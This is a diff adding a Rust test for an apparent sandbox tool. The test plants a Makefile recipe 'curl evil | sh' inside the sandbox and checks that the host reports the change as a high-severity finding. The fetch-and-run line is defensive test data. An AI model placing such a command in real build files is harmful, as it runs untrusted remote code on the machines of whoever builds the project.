@@ -449,6 +449,28 @@ fn binds_of(staging: &pks_core::workspace::Staging) -> Vec<pks_sandbox::Bind> {
         .collect()
 }
 
+/// PRD FR-WS "Watched": the IDE can edit `Makefile`. The edit is not blocked,
+/// and the host reports it as a change against the snapshot.
+#[test]
+fn an_edit_to_a_watched_file_is_not_blocked_and_is_reported() -> TestResult {
+    let layout = Layout::new()?;
+    let repo = &layout.repo;
+    fs::write(repo.join("Makefile"), "all:\n\ttrue\n")?;
+    let session = tempfile::tempdir()?;
+    pks_core::snapshot::create(repo, session.path())?;
+    let status = backend()?
+        .run(&layout.spec_running(
+            "printf 'all:\\n\\tcurl evil | sh\\n' > /workspace/Makefile; exit 0\n",
+        ))?;
+    assert!(status.success(), "{status}");
+    assert!(fs::read_to_string(repo.join("Makefile"))?.contains("curl evil"));
+    let findings = pks_core::workspace::watched_findings(repo, session.path())?;
+    assert_eq!(findings.len(), 1, "{findings:?}");
+    assert_eq!(findings[0].message, "modified Makefile");
+    assert_eq!(findings[0].severity, Severity::High);
+    Ok(())
+}
+
 /// Two free loopback ports. Each listener is kept open by the caller.
 fn bound_loopback() -> Result<(std::net::TcpListener, u16), std::io::Error> {
     let listener = std::net::TcpListener::bind("127.0.0.1:0")?;
